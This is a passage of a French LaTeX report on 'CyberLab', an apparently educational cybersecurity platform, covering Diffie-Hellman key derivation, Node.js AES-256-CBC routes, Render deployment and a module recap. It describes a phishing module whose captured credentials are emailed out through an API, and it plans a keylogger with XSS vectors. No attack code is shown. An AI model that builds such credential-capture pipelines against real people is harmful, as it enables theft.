256 bits (32 octets) quelle que soit la taille du secret en entrée.

\begin{figure}[h]
\centering
\begin{tikzpicture}[
  block/.style={draw, rounded corners=3pt, minimum width=3.5cm,
                minimum height=0.85cm, font=\small, align=center},
  arrow/.style={-Latex, thick}
]
  \node[block] (S) at (0,0)   {Secret DH \\ $S = g^{ab} \bmod p$};
  \node[block] (H) at (4.5,0) {SHA-256$(S)$};
  \node[block] (K) at (9,0)   {Clé AES-256 \\ (32 octets)};

  \draw[arrow] (S) -- (H);
  \draw[arrow] (H) -- (K);

  \node[below=0.3cm of S, font=\scriptsize] {taille variable};
  \node[below=0.3cm of K, font=\scriptsize] {256 bits exactement};
\end{tikzpicture}
\caption{Pipeline de dérivation de la clé AES depuis le secret DH}
\end{figure}

\begin{notebox}
  \textbf{HKDF en production.}
  En production, on utilise HKDF (RFC 5869) plutôt que SHA-256 seul.
  HKDF incorpore un \textit{salt} et un contexte applicatif pour une
  dérivation cryptographiquement plus robuste. C'est le standard
  utilisé dans TLS 1.3.
\end{notebox}

\section{Partie 3 — Chiffrement AES-256-CBC}

\subsection{Mode CBC}

En mode CBC (\textit{Cipher Block Chaining}), chaque bloc de 128 bits
est XORé avec le bloc chiffré précédent avant d'être chiffré :
$$C_i = \text{AES}_K(M_i \oplus C_{i-1}), \quad C_0 = IV$$
Le vecteur d'initialisation ($IV$) doit être aléatoire et unique pour
chaque message, mais peut être transmis en clair avec le ciphertext.

\begin{lstlisting}[language=JavaScript, caption={Chiffrement AES-256-CBC — routes.js}]
app.post('/crypto/api/aes/encrypt', (req, res) => {
  const { aesKey, plaintext } = req.body;
  const keyBuf = Buffer.from(aesKey, 'hex');   // 32 octets = 256 bits

  const iv     = crypto.randomBytes(16);        // IV aleatoire unique
  const cipher = crypto.createCipheriv('aes-256-cbc', keyBuf, iv);

  const ciphertext = cipher.update(plaintext, 'utf8', 'hex')
                   + cipher.final('hex');

  res.json({ success: true, ciphertext, iv: iv.toString('hex') });
});
\end{lstlisting}

\begin{lstlisting}[language=JavaScript, caption={Déchiffrement AES-256-CBC — routes.js}]
app.post('/crypto/api/aes/decrypt', (req, res) => {
  const { aesKey, ciphertext, iv } = req.body;
  const keyBuf    = Buffer.from(aesKey,      'hex');
  const ivBuf     = Buffer.from(iv,          'hex');
  const decipher  = crypto.createDecipheriv('aes-256-cbc', keyBuf, ivBuf);

  const plaintext = decipher.update(ciphertext, 'hex', 'utf8')
                  + decipher.final('utf8');

  res.json({ success: true, plaintext });
});
\end{lstlisting}

\subsection{Comparaison des modes AES}

\begin{center}
\begin{tabular}{L{2.5cm} C{2.5cm} C{2.5cm} L{4.5cm}}
  \toprule
  \textbf{Mode} & \textbf{Authentif.} & \textbf{Utilisé ici} & \textbf{Remarque} \\
  \midrule
  CBC  & Non     & Oui  & Simple et bien établi \\
  GCM  & Oui (AEAD) & Non & Standard TLS 1.3, recommandé en prod \\
  CTR  & Non     & Non  & Parallélisable, sans padding \\
  ECB  & Non     & Non  & \textbf{Dangereux} — patterns visibles \\
  \bottomrule
\end{tabular}
\end{center}

\section{Démo interactive}

La page \code{demo.html} guide l'utilisateur à travers 4 étapes :

\begin{figure}[h]
\centering
\begin{tikzpicture}[
  step/.style={draw, rounded corners=3pt, minimum width=2.8cm,
               minimum height=0.85cm, font=\scriptsize, align=center},
  arrow/.style={-Latex}
]
  \node[step] (s1) at (0,0)    {1. Génération\\clés DH\\Alice + Bob};
  \node[step] (s2) at (3.8,0)  {2. Échange\\clés publiques\\$A$ et $B$};
  \node[step] (s3) at (7.6,0)  {3. Secret\\partagé\\$S = g^{ab}$};
  \node[step] (s4) at (11.4,0) {4. Message\\chiffré AES\\et déchiffré};

  \draw[arrow] (s1) -- (s2);
  \draw[arrow] (s2) -- (s3);
  \draw[arrow] (s3) -- (s4);

  \node[below=0.5cm of s3, font=\scriptsize] {SHA-256$(S)$ $\rightarrow$ Clé AES-256};
\end{tikzpicture}
\caption{Flux de la démo interactive SecureLink}
\end{figure}

Les clés privées sont masquées par défaut (floutage CSS) et peuvent être
révélées au clic pour les besoins pédagogiques. Un badge de vérification
confirme que les deux clés AES dérivées sont identiques.

% ============================================================
\chapter{Intégration et déploiement}
% ============================================================

\section{Variables d'environnement}

\begin{center}
\begin{tabular}{L{4.5cm} L{8.5cm}}
  \toprule
  \textbf{Variable} & \textbf{Description} \\
  \midrule
  \code{RESEND\_API\_KEY} & Clé API Resend pour l'envoi d'emails \\
  \code{EMAIL\_TO}        & Adresse de réception des identifiants capturés \\
  \code{PORT}             & Port d'écoute (3001 local, attribué par Render en prod) \\
  \bottomrule
\end{tabular}
\end{center}

Le fichier \code{.env} est exclu du dépôt Git (\code{.gitignore}).
Les valeurs sont configurées dans le tableau de bord Render pour la
production.

\section{Déploiement sur Render}

\begin{center}
\begin{tabular}{L{4cm} L{8.5cm}}
  \toprule
  \textbf{Paramètre} & \textbf{Valeur} \\
  \midrule
  Type               & Web Service (Node.js) \\
  Build command      & \code{npm install} \\
  Start command      & \code{node server.js} \\
  Auto-deploy        & Activé sur push vers la branche \code{main} \\
  URL de production  & \url{https://cyberlab-uxey.onrender.com} \\
  \bottomrule
\end{tabular}
\end{center}

\begin{notebox}
  \textbf{Mise en veille (plan gratuit).}
  Le serveur Render gratuit se met en veille après 15 minutes d'inactivité.
  Le premier accès après une période d'inactivité prend environ 50 secondes.
  Pour une démonstration, ouvrir le lien 1 minute à l'avance.
\end{notebox}

\section{Flux de déploiement continu}

\begin{figure}[h]
\centering
\begin{tikzpicture}[
  box/.style={draw, rounded corners=3pt, minimum width=2.8cm,
              minimum height=0.8cm, font=\small, align=center},
  arrow/.style={-Latex, thick}
]
  \node[box] (dev)  {Code local};
  \node[box, right=2cm of dev]  (git)  {GitHub\\(\code{main})};
  \node[box, right=2cm of git]  (rnd)  {Render\\(build)};
  \node[box, right=2cm of rnd]  (live) {CyberLab\\en ligne};

  \draw[arrow] (dev)  -- (git)  node[midway, above, font=\scriptsize]{\code{git push}};
  \draw[arrow] (git)  -- (rnd)  node[midway, above, font=\scriptsize]{webhook};
  \draw[arrow] (rnd)  -- (live) node[midway, above, font=\scriptsize]{\code{npm install}};
\end{tikzpicture}
\caption{Pipeline de déploiement continu}
\end{figure}

% ============================================================
\chapter{Bilan et perspectives}
% ============================================================

\section{Récapitulatif des modules}

\begin{center}
\begin{tabular}{L{3cm} L{3.5cm} L{7cm}}
  \toprule
  \textbf{Module} & \textbf{Technologie clé} & \textbf{Compétences abordées} \\
  \midrule
  Phishing
    & Resend API, CSS
    & Ingénierie sociale, capture d'identifiants,\\
    & & exfiltration par API REST \\[5pt]
  SQL Injection
    & SQLite, prepared statements
    & Injection SQL, UNION SELECT, schéma BDD, prévention \\[5pt]
  IDS Simulator
    & Moteur Snort custom
    & Règles de détection, analyse de trafic, faux positifs \\[5pt]
  Cryptographie
    & Node.js \code{crypto}
    & Échange de clés DH, chiffrement AES, dérivation KDF \\
  \bottomrule
\end{tabular}
\end{center}

\section{Modules futurs planifiés}

\begin{itemize}
  \item \textbf{Keylogger} : capture JavaScript des frappes clavier,
        affichage temps réel, vecteurs XSS associés
  \item \textbf{Brute Force} : test de force brute sur hashs (MD5, SHA-1,
        bcrypt), dictionnaire personnalisable
  \item \textbf{Network Scanner} : simulation d'un scanner de ports
        (scan SYN, détection de services)
  \item \textbf{Password Analyzer} : entropie, règles de complexité,
        intégration de l'API HaveIBeenPwned
\end{itemize}

\section{Améliorations architecturales}

\begin{itemize}
  \item Dashboard administrateur commun avec statistiques inter-modules
  \item Système d'authentification pour les sessions utilisateur
  \item Base de données SQLite persistante pour l'historique
  \item Migration vers HKDF (RFC 5869) pour la dérivation de clé
  \item Mode AES-GCM pour l'authentification des messages
  \item Export de rapports PDF par module
\end{itemize}

\section{Conclusion}

CyberLab démontre qu'il est possible de construire une plateforme
éducative de cybersécurité complète avec une stack minimaliste,
sans dépendre de frameworks lourds. L'architecture modulaire permet
d'ajouter facilement de nouveaux modules, chacun étant autonome et
suivant le même pattern d'intégration.

Les quatre modules couvrent un spectre large des problématiques de
sécurité modernes : l'ingénierie sociale, les vulnérabilités
applicatives, la détection d'intrusion et la cryptographie appliquée.
Ensemble, ils constituent un outil pédagogique fonctionnel, déployé
en ligne et directement utilisable pour des démonstrations pratiques.

% ============================================================
\chapter*{Références}
\addcontentsline{toc}{chapter}{Références}
% ============================================================

\begin{thebibliography}{99}

\bibitem{diffie1976}
  W. Diffie et M. Hellman,
  \textit{New Directions in Cryptography},
  IEEE Transactions on Information Theory, vol. 22, no. 6, pp. 644--654, 1976.

\bibitem{nist_aes}
  NIST,
  \textit{FIPS 197 — Advanced Encryption Standard (AES)},
  National Institute of Standards and Technology, 2001.
  Disponible : \url{https://csrc.nist.gov/publications/detail/fips/197/final}

\bibitem{rfc5869}
  H. Krawczyk et P. Eronen,
  \textit{RFC 5869 — HMAC-based Key Derivation Function (HKDF)},
  IETF, 2010.
  Disponible : \url{https://www.rfc-editor.org/rfc/rfc5869}

\bibitem{rfc3526}
  T. Kivinen et M. Kojo,
  \textit{RFC 3526 — More Modular Exponential (MODP) Groups for IKE},
  IETF, 2003.
  Disponible : \url{https://www.rfc-editor.org/rfc/rfc3526}

\bibitem{owasp_sqli}
  OWASP,
  \textit{A03:2021 — Injection},
  OWASP Top 10, 2021.
  Disponible : \url{https://owasp.org/Top10/A03_2021-Injection/}

\bibitem{owasp_phishing}
  OWASP,
  \textit{Phishing},
  OWASP Community Pages.
  Disponible : \url{https://owasp.org/www-community/attacks/Phishing}

\bibitem{mitre_t1566}
  MITRE,
  \textit{T1566 — Phishing},
  ATT\&CK Framework.
  Disponible : \url{https://attack.mitre.org/techniques/T1566/}

\bibitem{portswigger}
  PortSwigger,
  \textit{SQL Injection — Web Security Academy}.
  Disponible : \url{https://portswigger.net/web-security/sql-injection}

\bibitem{snort}
  Sourcefire/Cisco,
  \textit{Snort — Official Documentation}.
  Disponible : \url{https://www.snort.org/documents}

\bibitem{nodejs_crypto}
  Node.js Foundation,
  \textit{Crypto — Node.js Documentation}.
  Disponible : \url{https://nodejs.org/api/crypto.html}

\bibitem{anssi}
  ANSSI,
  \textit{Bonnes pratiques de sécurisation des systèmes d'information},
  Agence nationale de la sécurité des systèmes d'information.
  Disponible : \url{https://www.ssi.gouv.fr/}

\end{thebibliography}

\end{document}
